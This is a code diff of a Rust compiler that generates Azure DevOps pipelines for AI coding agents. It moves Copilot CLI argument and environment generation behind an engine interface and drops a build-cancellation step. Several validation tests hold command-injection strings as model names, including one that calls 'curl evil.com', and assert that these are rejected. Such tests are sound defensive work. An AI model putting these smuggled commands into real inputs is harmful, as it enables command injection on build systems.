@@ -7,7 +7,6 @@ use std::path::Path;
 use super::types::{FrontMatter, PipelineParameter, Repository, TriggerConfig};
 use super::extensions::{CompilerExtension, Extension, McpgServerConfig, McpgGatewayConfig, McpgConfig, CompileContext};
 use crate::compile::types::McpConfig;
-use crate::engine::Engine as _;
 use crate::fuzzy_schedule;
 use crate::allowed_hosts::{CORE_ALLOWED_HOSTS, mcp_required_hosts};
 use crate::ecosystem_domains::{get_ecosystem_domains, is_ecosystem_identifier, is_known_ecosystem};
@@ -366,41 +365,6 @@ pub fn generate_pipeline_resources(triggers: &Option<TriggerConfig>) -> Result<S
     Ok(yaml)
 }
 
-/// Generate a step to cancel previous queued/running builds
-pub fn generate_cancel_previous_builds(triggers: &Option<TriggerConfig>) -> String {
-    let has_pipeline_trigger = triggers
-        .as_ref()
-        .and_then(|t| t.pipeline.as_ref())
-        .is_some();
-
-    if !has_pipeline_trigger {
-        return String::new();
-    }
-
-    r#"- bash: |
-    CURRENT_BUILD_ID=$(Build.BuildId)
-
-    # Get queued or running builds for THIS pipeline definition only
-    BUILDS=$(curl -s -u ":$SYSTEM_ACCESSTOKEN" \
-    "$(System.CollectionUri)$(System.TeamProject)/_apis/build/builds?definitions=$(System.DefinitionId)&statusFilter=notStarted,inProgress&api-version=7.1" \
-    | jq -r --arg current "$CURRENT_BUILD_ID" '.value[] | select(.id != ($current | tonumber)) | .id')
-
-    if [ -z "$BUILDS" ]; then
-    echo "No other queued/running builds to cancel"
-    else
-    for BUILD_ID in $BUILDS; do
-        echo "Cancelling build $BUILD_ID"
-        curl -s -X PATCH -u ":$SYSTEM_ACCESSTOKEN" \
-        -H "Content-Type: application/json" \
-        -d '{"status": "cancelling"}' \
-        "$(System.CollectionUri)$(System.TeamProject)/_apis/build/builds/$BUILD_ID?api-version=7.1"
-    done
-    fi
-  displayName: "Cancel previous queued builds"
-  env:
-    SYSTEM_ACCESSTOKEN: $(System.AccessToken)"#.to_string()
-}
-
 /// Generate repository resources YAML
 pub fn generate_repositories(repositories: &[Repository]) -> String {
     if repositories.is_empty() {
@@ -457,14 +421,6 @@ pub fn validate_checkout_list(repositories: &[Repository], checkout: &[String]) 
     }
 
     Ok(())
-}
-
-/// Generate copilot CLI params from front matter configuration
-pub fn generate_copilot_params(
-    front_matter: &FrontMatter,
-    extensions: &[super::extensions::Extension],
-) -> Result<String> {
-    crate::engine::GITHUB_COPILOT_CLI_ENGINE.generate_cli_params(front_matter, extensions)
 }
 
 /// Compute the effective workspace based on explicit setting and checkout configuration.
@@ -908,13 +864,6 @@ pub fn generate_acquire_ado_token(service_connection: Option<&str>, variable_nam
         }
         None => String::new(),
     }
-}
-
-/// Generate the env block entries for the copilot AWF step (Stage 1 agent).
-/// Uses the read-only token from the read service connection.
-/// When not configured, omits ADO access tokens entirely.
-pub fn generate_copilot_ado_env(read_service_connection: Option<&str>) -> String {
-    crate::engine::GITHUB_COPILOT_CLI_ENGINE.generate_agent_ado_env(read_service_connection)
 }
 
 /// Generate the env block entries for the executor step (Stage 3 Execution).
@@ -1967,7 +1916,7 @@ pub async fn compile_shared(
     }
 
     // 4. Generate copilot params
-    let copilot_params = generate_copilot_params(front_matter, extensions)?;
+    let copilot_params = ctx.engine.args(ctx.front_matter, extensions)?;
 
     // 5. Compute workspace, working directory, triggers
     let effective_workspace = compute_effective_workspace(
@@ -2015,12 +1964,7 @@ pub async fn compile_shared(
             .and_then(|p| p.read.as_deref()),
         "SC_READ_TOKEN",
     );
-    let copilot_ado_env = generate_copilot_ado_env(
-        front_matter
-            .permissions
-            .as_ref()
-            .and_then(|p| p.read.as_deref()),
-    );
+    let engine_env = ctx.engine.env();
     let acquire_write_token = generate_acquire_ado_token(
         front_matter
             .permissions
@@ -2101,7 +2045,7 @@ pub async fn compile_shared(
         ("{{ workspace }}", &working_directory),
         ("{{ agent_content }}", markdown_body),
         ("{{ acquire_ado_token }}", &acquire_read_token),
-        ("{{ copilot_ado_env }}", &copilot_ado_env),
+        ("{{ engine_env }}", &engine_env),
         ("{{ acquire_write_token }}", &acquire_write_token),
         ("{{ executor_ado_env }}", &executor_ado_env),
     ];
@@ -2212,7 +2156,7 @@ mod tests {
         assert!(result.is_ok());
     }
 
-    // ─── generate_copilot_params ──────────────────────────────────────────────
+    // ─── Engine::args (copilot params) ──────────────────────────────────────
 
     #[test]
     fn test_copilot_params_bash_wildcard() {
@@ -2223,7 +2167,7 @@ mod tests {
             cache_memory: None,
             azure_devops: None,
         });
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(params.contains("--allow-all-tools"), "wildcard bash should emit --allow-all-tools");
         assert!(!params.contains("--allow-tool"), "no individual --allow-tool flags with --allow-all-tools");
     }
@@ -2237,7 +2181,7 @@ mod tests {
             cache_memory: None,
             azure_devops: None,
         });
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(params.contains("--allow-all-tools"), "\"*\" should behave same as \":*\"");
         assert!(!params.contains("--allow-tool"), "no individual --allow-tool flags with --allow-all-tools");
     }
@@ -2251,14 +2195,14 @@ mod tests {
             cache_memory: None,
             azure_devops: None,
         });
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("shell("));
     }
 
     #[test]
     fn test_copilot_params_allow_all_paths_when_edit_enabled() {
         let fm = minimal_front_matter(); // edit defaults to true, bash defaults to wildcard
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(params.contains("--allow-all-paths"), "edit enabled (default) should emit --allow-all-paths");
         assert!(params.contains("--allow-all-tools"), "default (no bash) should emit --allow-all-tools");
         assert!(!params.contains("--allow-tool"), "no individual --allow-tool flags with --allow-all-tools");
@@ -2273,7 +2217,7 @@ mod tests {
             cache_memory: None,
             azure_devops: None,
         });
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("--allow-all-paths"), "edit disabled should NOT emit --allow-all-paths");
         assert!(!params.contains("--allow-tool write"), "edit disabled should NOT emit --allow-tool write");
     }
@@ -2287,7 +2231,7 @@ mod tests {
             cache_memory: None,
             azure_devops: None,
         });
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(params.contains("--allow-all-tools"), "wildcard bash should emit --allow-all-tools");
         assert!(params.contains("--allow-all-paths"), "edit enabled should still emit --allow-all-paths");
         assert!(!params.contains("--allow-tool"), "no individual --allow-tool flags");
@@ -2305,7 +2249,7 @@ mod tests {
         fm.runtimes = Some(crate::compile::types::RuntimesConfig {
             lean: Some(crate::runtimes::lean::LeanRuntimeConfig::Enabled(true)),
         });
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(params.contains("shell(lean)"), "lean command should be allowed");
         assert!(params.contains("shell(lake)"), "lake command should be allowed");
         assert!(params.contains("shell(elan)"), "elan command should be allowed");
@@ -2325,7 +2269,7 @@ mod tests {
         fm.runtimes = Some(crate::compile::types::RuntimesConfig {
             lean: Some(crate::runtimes::lean::LeanRuntimeConfig::Enabled(true)),
         });
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(params.contains("--allow-all-tools"), "wildcard should use --allow-all-tools");
         // Should NOT add individual tool flags when --allow-all-tools is active
         assert!(!params.contains("--allow-tool"), "no individual tool flags with --allow-all-tools");
@@ -2341,7 +2285,7 @@ mod tests {
                 ..Default::default()
             }),
         );
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(
             !params.contains("--allow-tool my-tool"),
             "default (all-tools) mode should not emit individual --allow-tool for MCPs"
@@ -2364,7 +2308,7 @@ mod tests {
                 ..Default::default()
             }),
         );
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(params.contains("--allow-tool my-tool"), "container MCP should get --allow-tool");
     }
 
@@ -2384,7 +2328,7 @@ mod tests {
                 ..Default::default()
             }),
         );
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(params.contains("--allow-tool remote-ado"), "URL MCP should get --allow-tool");
     }
 
@@ -2395,7 +2339,7 @@ mod tests {
             "my-tool".to_string(),
             McpConfig::Enabled(true),
         );
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("--allow-tool my-tool"), "Enabled(true) with no container/url should not get --allow-tool");
     }
 
@@ -2422,7 +2366,7 @@ mod tests {
                 ..Default::default()
             }),
         );
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         let a_pos = params.find("--allow-tool a-tool").expect("a-tool should be present");
         let z_pos = params.find("--allow-tool z-tool").expect("z-tool should be present");
         assert!(a_pos < z_pos, "MCPs should be sorted alphabetically: a-tool before z-tool");
@@ -2433,7 +2377,7 @@ mod tests {
         let mut fm = minimal_front_matter();
         fm.mcp_servers
             .insert("ado".to_string(), McpConfig::Enabled(true));
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         // Copilot CLI has no built-in MCPs — all MCPs are handled via the MCP firewall
         assert!(!params.contains("--mcp ado"));
     }
@@ -2444,14 +2388,14 @@ mod tests {
             "---\nname: test\ndescription: test\nengine:\n  model: claude-opus-4.5\n  max-turns: 50\n---\n",
         )
         .unwrap();
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("--max-turns"), "max-turns should not be emitted as a CLI arg");
     }
 
     #[test]
     fn test_copilot_params_no_max_turns_when_simple_engine() {
         let fm = minimal_front_matter();
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("--max-turns"));
     }
 
@@ -2461,14 +2405,14 @@ mod tests {
             "---\nname: test\ndescription: test\nengine:\n  model: claude-opus-4.5\n  timeout-minutes: 30\n---\n",
         )
         .unwrap();
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("--max-timeout"), "timeout-minutes should not be emitted as a CLI arg");
     }
 
     #[test]
     fn test_copilot_params_no_max_timeout_when_simple_engine() {
         let fm = minimal_front_matter();
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("--max-timeout"));
     }
 
@@ -2478,7 +2422,7 @@ mod tests {
             "---\nname: test\ndescription: test\nengine:\n  model: claude-opus-4.5\n  max-turns: 0\n---\n",
         )
         .unwrap();
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("--max-turns"), "max-turns should not be emitted as a CLI arg");
     }
 
@@ -2488,7 +2432,7 @@ mod tests {
             "---\nname: test\ndescription: test\nengine:\n  model: claude-opus-4.5\n  timeout-minutes: 0\n---\n",
         )
         .unwrap();
-        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
+        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("--max-timeout"), "timeout-minutes should not be emitted as a CLI arg");
     }
 
@@ -2698,37 +2642,6 @@ mod tests {
         let result = generate_pipeline_resources(&triggers).unwrap();
         // The pipeline resource ID should be snake_case derived from the name
         assert!(result.contains("pipeline: my_build_pipeline"));
-    }
-
-    // ─── generate_cancel_previous_builds ─────────────────────────────────────
-
-    #[test]
-    fn test_generate_cancel_previous_builds_no_triggers() {
-        let result = generate_cancel_previous_builds(&None);
-        assert!(result.is_empty());
-    }
-
-    #[test]
-    fn test_generate_cancel_previous_builds_no_pipeline_trigger() {
-        let triggers = Some(crate::compile::types::TriggerConfig { pipeline: None });
-        let result = generate_cancel_previous_builds(&triggers);
-        assert!(result.is_empty());
-    }
-
-    #[test]
-    fn test_generate_cancel_previous_builds_with_pipeline_trigger() {
-        let triggers = Some(crate::compile::types::TriggerConfig {
-            pipeline: Some(crate::compile::types::PipelineTrigger {
-                name: "Build".into(),
-                project: None,
-                branches: vec![],
-            }),
-        });
-        let result = generate_cancel_previous_builds(&triggers);
-        assert!(!result.is_empty());
-        assert!(result.contains("Cancel previous queued builds"));
-        assert!(result.contains("SYSTEM_ACCESSTOKEN"));
-        assert!(result.contains("cancelling"));
     }
 
     // ─── generate_header_comment ────────────────────────────────────────────
@@ -3420,26 +3333,20 @@ mod tests {
         assert!(!result.contains("SC_READ_TOKEN"));
     }
 
-    // ─── generate_copilot_ado_env / generate_executor_ado_env ────────────────
+    // ─── engine env / generate_executor_ado_env ────────────────────────────
 
     #[test]
-    fn test_generate_copilot_ado_env_with_connection() {
-        let result = generate_copilot_ado_env(Some("my-sc"));
+    fn test_engine_env() {
+        let fm = minimal_front_matter();
+        let ctx = CompileContext::for_test(&fm);
+        let result = ctx.engine.env();
         assert!(
-            result.contains("AZURE_DEVOPS_EXT_PAT: $(SC_READ_TOKEN)"),
-            "Should set AZURE_DEVOPS_EXT_PAT to SC_READ_TOKEN"
+            result.contains("GITHUB_TOKEN: $(GITHUB_TOKEN)"),
+            "Should include GITHUB_TOKEN"
         );
         assert!(
-            result.contains("SYSTEM_ACCESSTOKEN: $(SC_READ_TOKEN)"),
-            "Should set SYSTEM_ACCESSTOKEN to SC_READ_TOKEN"
-        );
-    }
-
-    #[test]
-    fn test_generate_copilot_ado_env_none_empty() {
-        assert!(
-            generate_copilot_ado_env(None).is_empty(),
-            "None service connection should produce empty env block"
+            !result.contains("AZURE_DEVOPS_EXT_PAT"),
+            "ADO token is handled by MCPG, not engine env"
         );
     }
 
@@ -3469,12 +3376,15 @@ mod tests {
 
     #[test]
     fn test_model_name_rejects_single_quote() {
-        let (mut fm, _) = parse_markdown(
-            "---\nname: test\ndescription: test\nengine: claude-opus-4.5\n---\n",
-        )
-        .unwrap();
-        fm.engine = crate::compile::types::EngineConfig::Simple("model' && echo pwned".to_string());
-        let result = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm));
+        let mut fm = minimal_front_matter();
+        fm.engine = crate::compile::types::EngineConfig::Full(crate::compile::types::EngineOptions {
+            id: Some("copilot".to_string()),
+            model: Some("model' && echo pwned".to_string()),
+            version: None, agent: None, api_target: None,
+            args: vec![], env: None, command: None,
+            max_turns: None, timeout_minutes: None,
+        });
+        let result = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm));
         assert!(result.is_err());
         assert!(result.unwrap_err().to_string().contains("invalid characters"));
     }
@@ -3482,8 +3392,14 @@ mod tests {
     #[test]
     fn test_model_name_rejects_space() {
         let mut fm = minimal_front_matter();
-        fm.engine = crate::compile::types::EngineConfig::Simple("model && curl evil.com".to_string());
-        let result = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm));
+        fm.engine = crate::compile::types::EngineConfig::Full(crate::compile::types::EngineOptions {
+            id: Some("copilot".to_string()),
+            model: Some("model && curl evil.com".to_string()),
+            version: None, agent: None, api_target: None,
+            args: vec![], env: None, command: None,
+            max_turns: None, timeout_minutes: None,
+        });
+        let result = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm));
         assert!(result.is_err());
     }
 
@@ -3491,8 +3407,14 @@ mod tests {
     fn test_model_name_allows_valid_names() {
         for name in &["claude-opus-4.5", "gpt-5.2-codex", "gemini-3-pro-preview", "my_model:latest"] {
             let mut fm = minimal_front_matter();
-            fm.engine = crate::compile::types::EngineConfig::Simple(name.to_string());
-            let result = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm));
+            fm.engine = crate::compile::types::EngineConfig::Full(crate::compile::types::EngineOptions {
+                id: Some("copilot".to_string()),
+                model: Some(name.to_string()),
+                version: None, agent: None, api_target: None,
+                args: vec![], env: None, command: None,
+                max_turns: None, timeout_minutes: None,
+            });
+            let result = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm));
             assert!(result.is_ok(), "Model name '{}' should be valid", name);
         }
     }
@@ -3506,7 +3428,7 @@ mod tests {
             cache_memory: None,
             azure_devops: None,
         });
-        let result = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm));
+        let result = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm));
         assert!(result.is_err());
         assert!(result.unwrap_err().to_string().contains("single quote"));
     }
